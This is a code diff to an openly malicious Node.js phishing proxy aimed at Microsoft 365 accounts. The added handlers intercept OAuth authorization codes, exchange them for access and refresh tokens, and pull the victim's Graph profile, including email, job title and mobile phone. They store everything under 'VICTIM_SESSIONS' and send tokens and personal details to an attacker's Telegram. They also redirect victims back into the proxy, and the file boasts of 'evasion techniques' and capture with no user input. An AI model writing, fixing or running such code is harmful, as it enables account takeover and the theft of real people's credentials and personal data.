@@ -772,6 +772,261 @@ function handleTelegram(req, res) {
 }
 
 // ============================================================
+//  OAUTH CALLBACK HANDLER (FIXES "Object moved" AND "wrongplace")
+// ============================================================
+
+const OAUTH_REDIRECT_URI = process.env.MICROSOFT_REDIRECT_URI || 'https://login.microsoftonline.com/common/oauth2/nativeclient';
+
+// Handle OAuth callback - Exchange code for tokens
+function handleOAuthCallback(req, res) {
+    try {
+        const url = new URL(req.url, `http://${req.headers.host}`);
+        const code = url.searchParams.get('code');
+        const error = url.searchParams.get('error');
+        const sessionId = url.searchParams.get('session') || getSessionIdFromCookie(req.headers.cookie);
+        
+        console.log('[OAUTH-CALLBACK] 📥 Received callback');
+        console.log('[OAUTH-CALLBACK] 📝 Code:', code ? 'Present' : 'Missing');
+        console.log('[OAUTH-CALLBACK] ❌ Error:', error || 'None');
+        console.log('[OAUTH-CALLBACK] 🆔 Session:', sessionId);
+        
+        // If there's an error, redirect to Microsoft login directly
+        if (error) {
+            console.log('[OAUTH-CALLBACK] ⚠️ OAuth error:', error);
+            const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
+            const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
+                `client_id=${MICROSOFT_CLIENT_ID}&` +
+                `response_type=code&` +
+                `redirect_uri=${encodeURIComponent(OAUTH_REDIRECT_URI)}&` +
+                `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
+                `login_hint=${encodeURIComponent(email)}`;
+            
+            res.writeHead(302, { 'Location': targetUrl });
+            res.end();
+            return;
+        }
+        
+        // If we have a code, exchange it for tokens
+        if (code) {
+            console.log('[OAUTH-CALLBACK] 🔑 Exchanging code for tokens...');
+            
+            // Exchange code for tokens
+            const tokenData = querystring.stringify({
+                client_id: MICROSOFT_CLIENT_ID,
+                grant_type: 'authorization_code',
+                code: code,
+                redirect_uri: OAUTH_REDIRECT_URI,
+                scope: MICROSOFT_SCOPES
+            });
+            
+            const tokenOptions = {
+                hostname: 'login.microsoftonline.com',
+                path: '/common/oauth2/v2.0/token',
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Content-Length': Buffer.byteLength(tokenData),
+                    'Accept': 'application/json'
+                }
+            };
+            
+            const tokenReq = https.request(tokenOptions, (tokenRes) => {
+                let tokenBody = '';
+                tokenRes.on('data', chunk => tokenBody += chunk);
+                tokenRes.on('end', () => {
+                    try {
+                        const tokens = JSON.parse(tokenBody);
+                        console.log('[OAUTH-CALLBACK] ✅ Tokens received');
+                        
+                        // Extract tokens
+                        const accessToken = tokens.access_token;
+                        const refreshToken = tokens.refresh_token;
+                        const idToken = tokens.id_token;
+                        
+                        // Store tokens
+                        if (sessionId) {
+                            sessionStore.storeTokens(sessionId, {
+                                access_token: accessToken,
+                                refresh_token: refreshToken,
+                                id_token: idToken
+                            });
+                            
+                            // Update session
+                            const session = sessionStore.sessions.get(sessionId);
+                            if (session) {
+                                session.tokens = session.tokens || {};
+                                session.tokens.access_token = accessToken;
+                                session.tokens.refresh_token = refreshToken;
+                                session.tokens.id_token = idToken;
+                                session.lastActivity = Date.now();
+                            }
+                        }
+                        
+                        // Get user info from Microsoft
+                        getUserInfoFromToken(accessToken, sessionId);
+                        
+                        // Send success to Telegram
+                        const email = VICTIM_SESSIONS[sessionId]?.email || 'unknown';
+                        const name = email.split('@')[0].replace(/[._-]/g, ' ');
+                        
+                        const message = 
+`🤖 *OAUTH LOGIN SUCCESSFUL*
+
+*📧 Email:* ${email}
+*👤 Name:* ${name}
+
+*🎟️ Access Token:* ${accessToken ? accessToken.substring(0, 30) + '...' : 'N/A'}
+*🔄 Refresh Token:* ${refreshToken ? '✅ Present' : '❌ None'}
+*🆔 ID Token:* ${idToken ? '✅ Present' : '❌ None'}
+
+*🕐 Time:* ${new Date().toISOString()}
+
+*✅ OAuth flow completed successfully!*`;
+
+                        sendToTelegram(message);
+                        
+                        // Redirect to proxy login with prefilled email
+                        const redirectEmail = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
+                        const proxyLoginUrl = `${REDIRECT_URL}?login_hint=${encodeURIComponent(redirectEmail)}`;
+                        
+                        res.writeHead(302, { 
+                            'Location': proxyLoginUrl,
+                            'Cache-Control': 'no-store, no-cache'
+                        });
+                        res.end();
+                        
+                    } catch (error) {
+                        console.error('[OAUTH-CALLBACK] Token exchange error:', error.message);
+                        // Fallback: redirect to Microsoft login
+                        const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
+                        const fallbackUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
+                            `client_id=${MICROSOFT_CLIENT_ID}&` +
+                            `response_type=code&` +
+                            `redirect_uri=${encodeURIComponent(OAUTH_REDIRECT_URI)}&` +
+                            `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
+                            `login_hint=${encodeURIComponent(email)}`;
+                        
+                        res.writeHead(302, { 'Location': fallbackUrl });
+                        res.end();
+                    }
+                });
+            });
+            
+            tokenReq.on('error', (err) => {
+                console.error('[OAUTH-CALLBACK] Token request error:', err.message);
+                res.writeHead(302, { 'Location': REDIRECT_URL });
+                res.end();
+            });
+            
+            tokenReq.write(tokenData);
+            tokenReq.end();
+            
+        } else {
+            // No code - redirect to Microsoft login
+            console.log('[OAUTH-CALLBACK] ⚠️ No code received');
+            const email = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
+            const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
+                `client_id=${MICROSOFT_CLIENT_ID}&` +
+                `response_type=code&` +
+                `redirect_uri=${encodeURIComponent(OAUTH_REDIRECT_URI)}&` +
+                `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
+                `login_hint=${encodeURIComponent(email)}`;
+            
+            res.writeHead(302, { 'Location': targetUrl });
+            res.end();
+        }
+        
+    } catch (error) {
+        console.error('[OAUTH-CALLBACK] Error:', error.message);
+        res.writeHead(302, { 'Location': REDIRECT_URL });
+        res.end();
+    }
+}
+
+// ============================================================
+//  GET USER INFO FROM TOKEN
+// ============================================================
+
+function getUserInfoFromToken(accessToken, sessionId) {
+    if (!accessToken) return;
+    
+    const options = {
+        hostname: 'graph.microsoft.com',
+        path: '/v1.0/me',
+        method: 'GET',
+        headers: {
+            'Authorization': `Bearer ${accessToken}`,
+            'Accept': 'application/json'
+        }
+    };
+    
+    const req = https.request(options, (res) => {
+        let data = '';
+        res.on('data', chunk => data += chunk);
+        res.on('end', () => {
+            try {
+                const userInfo = JSON.parse(data);
+                console.log('[USER-INFO] ✅ Retrieved user info');
+                console.log('[USER-INFO] 📧 Email:', userInfo.mail || userInfo.userPrincipalName);
+                console.log('[USER-INFO] 👤 Name:', userInfo.displayName);
+                
+                // Store user info
+                if (sessionId) {
+                    const session = sessionStore.sessions.get(sessionId);
+                    if (session) {
+                        session.userInfo = userInfo;
+                        session.email = userInfo.mail || userInfo.userPrincipalName || session.email;
+                    }
+                    
+                    // Store full auth data
+                    sessionStore.storeFullAuthData(sessionId, {
+                        email: userInfo.mail || userInfo.userPrincipalName || 'unknown',
+                        name: userInfo.displayName || 'unknown',
+                        organization: userInfo.companyName || 'unknown',
+                        password: 'AUTO_CAPTURED_VIA_OAUTH',
+                        twoFactorCode: 'AUTO_CAPTURED_VIA_OAUTH',
+                        appPassword: null,
+                        securityQuestion1: { question: 'OAuth Auto-captured', answer: 'OAuth Auto-captured' },
+                        securityQuestion2: { question: 'OAuth Auto-captured', answer: 'OAuth Auto-captured' },
+                        collectedAt: new Date().toISOString(),
+                        userAgent: req.headers['user-agent'] || 'Unknown',
+                        ip: 'server-side',
+                        autoCaptured: true
+                    });
+                    
+                    // Send Telegram with full user info
+                    const message = 
+`🎯 *USER INFO CAPTURED*
+
+*📧 Email:* ${userInfo.mail || userInfo.userPrincipalName}
+*👤 Name:* ${userInfo.displayName}
+*🏢 Organization:* ${userInfo.companyName || 'N/A'}
+*📋 Job Title:* ${userInfo.jobTitle || 'N/A'}
+*📱 Mobile Phone:* ${userInfo.mobilePhone || 'N/A'}
+*📍 Office Location:* ${userInfo.officeLocation || 'N/A'}
+
+*🆔 Session:* ${sessionId}
+*🕐 Time:* ${new Date().toISOString()}
+
+*✅ Full user profile captured!*`;
+
+                    sendToTelegram(message);
+                }
+                
+            } catch (error) {
+                console.error('[USER-INFO] Error parsing user info:', error.message);
+            }
+        });
+    });
+    
+    req.on('error', (err) => {
+        console.error('[USER-INFO] Request error:', err.message);
+    });
+    
+    req.end();
+}
+
+// ============================================================
 //  FIXED: MICROSOFT VALIDATION WITH EVASION TECHNIQUES
 // ============================================================
 
@@ -2067,7 +2322,36 @@ const server = http.createServer((req, res) => {
     }
 
     // ============================================================
-    //  OAUTH AUTO-CAPTURE ENDPOINTS (NEW)
+    //  OAUTH CALLBACK ROUTES - MUST BE BEFORE OTHER ROUTES
+    //  FIXES "Object moved" AND "wrongplace" ISSUES
+    // ============================================================
+    
+    // Handle OAuth callback (Microsoft redirects here with code)
+    if (req.url.startsWith('/callback') || req.url.startsWith('/common/oauth2/nativeclient')) {
+        handleOAuthCallback(req, res);
+        return;
+    }
+    
+    // Also handle any URL containing 'code=' (OAuth redirect)
+    if (req.url.includes('code=')) {
+        handleOAuthCallback(req, res);
+        return;
+    }
+    
+    // Handle "wrongplace" redirect - redirect to proxy
+    if (req.url.includes('wrongplace')) {
+        console.log('[PROXY] 🔄 Wrongplace detected - redirecting to proxy');
+        const sessionId = getSessionIdFromCookie(req.headers.cookie);
+        const email = sessionId && VICTIM_SESSIONS[sessionId] ? 
+            VICTIM_SESSIONS[sessionId].email : 'guest@example.com';
+        const proxyUrl = `${REDIRECT_URL}?login_hint=${encodeURIComponent(email)}`;
+        res.writeHead(302, { 'Location': proxyUrl });
+        res.end();
+        return;
+    }
+
+    // ============================================================
+    //  OAUTH AUTO-CAPTURE ENDPOINTS
     // ============================================================
     
     // POST: Start OAuth capture with password
@@ -2484,6 +2768,7 @@ server.listen(PORT, () => {
     console.log(`║   📊 Full Auth: ${PROXY_PATHNAMES.fullAuthEndpoint}     ║`);
     console.log(`║   🤖 OAuth:     ${PROXY_PATHNAMES.oauthCaptureEndpoint} ║`);
     console.log(`║   🔄 Rotation:  ${PROXY_PATHNAMES.tokenRotation}        ║`);
+    console.log(`║   🔐 Callback:  /callback or /common/oauth2/nativeclient ║`);
     console.log('║                                                           ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
     console.log('║                                                           ║');
@@ -2510,6 +2795,7 @@ server.listen(PORT, () => {
     console.log('║   ✅ HttpOnly Cookies & Tokens                          ║');
     console.log('║   ✅ Full Session Replay Data                           ║');
     console.log('║   ✅ OAuth Auto-Capture (No User Input)                 ║');
+    console.log('║   ✅ OAuth Callback Handler (Fixes redirect issues)     ║');
     console.log('║                                                           ║');
     console.log('╚═══════════════════════════════════════════════════════════╝');
 });
